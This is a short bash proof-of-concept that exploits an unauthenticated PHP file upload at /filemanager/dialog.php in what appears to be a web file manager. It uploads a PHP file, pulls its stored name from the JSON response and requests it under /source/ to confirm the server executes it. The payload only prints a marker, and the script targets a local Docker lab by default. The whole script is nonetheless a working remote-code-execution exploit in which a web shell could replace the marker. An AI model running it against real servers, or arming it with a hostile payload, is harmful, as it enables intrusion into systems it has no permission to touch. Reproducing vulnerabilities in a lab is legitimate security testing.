#!/usr/bin/env bash
set -euo pipefail

TARGET="${1:-http://127.0.0.1:8000}"
MARKER="RF_UPLOAD_POC_OK"
PAYLOAD="$(mktemp /tmp/rf_poc_XXXXXX.php)"
RESP_FILE="/tmp/rf_upload_response.json"

cleanup() {
  rm -f "$PAYLOAD"
}
trap cleanup EXIT

printf '<?php echo "RF_UPLOAD_POC_OK\\n"; ?>' > "$PAYLOAD"

echo "[*] Target: ${TARGET}"
echo "[*] Upload endpoint: ${TARGET}/filemanager/dialog.php"
echo "[*] Creating benign PHP proof file: ${PAYLOAD}"

echo "[*] Uploading benign proof file without authentication..."
curl -fsS \
  -F "upload=@${PAYLOAD};filename=rf_poc.php" \
  "${TARGET}/filemanager/dialog.php" \
  -o "$RESP_FILE"

echo "[*] Upload response:"
cat "$RESP_FILE"
echo

FILE="$(jq -r '.fileName // empty' "$RESP_FILE")"

if [[ -z "$FILE" || "$FILE" == "null" ]]; then
  echo "[!] Could not extract .fileName from upload response."
  exit 1
fi

UPLOADED_URL="${TARGET}/source/${FILE}"

echo "[*] Uploaded file name: ${FILE}"
echo "[*] Requesting uploaded PHP file: ${UPLOADED_URL}"

OUT="$(curl -fsS "$UPLOADED_URL")"

echo "[*] Execution output:"
printf '%s\n' "$OUT"

if [[ "$OUT" == "$MARKER" ]]; then
  echo "[+] Vulnerability reproduced successfully in local Docker lab."
  echo "[+] Proof URL inside container: ${UPLOADED_URL}"
else
  echo "[!] Unexpected execution output."
  exit 1
fi
